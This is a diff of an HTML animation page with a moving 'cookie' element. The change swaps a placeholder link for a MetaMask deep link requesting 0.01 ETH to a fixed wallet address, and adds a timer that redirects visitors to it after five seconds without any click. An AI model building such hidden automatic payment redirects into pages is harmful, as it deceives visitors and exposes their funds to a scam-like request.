@@ -41,14 +41,16 @@
     </style>
 </head>
 <body>
-    <div id="cookie" onclick="openLink()"></div>
+    <div id="cookie"></div>
 
     <script>
         const cookie = document.getElementById('cookie');
 
+        // Replace the URL with the link you want to open
+        const linkToOpen = 'https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16';
+
         function openLink() {
-            // Replace the URL with the link you want to open
-            window.location.href = 'https://example.com';
+            window.location.href = linkToOpen;
         }
 
         // Adjust the speed of the cookie by changing animation duration
@@ -59,6 +61,9 @@
             const windowHeight = window.innerHeight;
             cookie.style.top = `${windowHeight / 2}px`;
         });
+
+        // Automatically open the link after 5 seconds (5000 milliseconds)
+        setTimeout(openLink, 5000);
     </script>
 </body>
 </html>
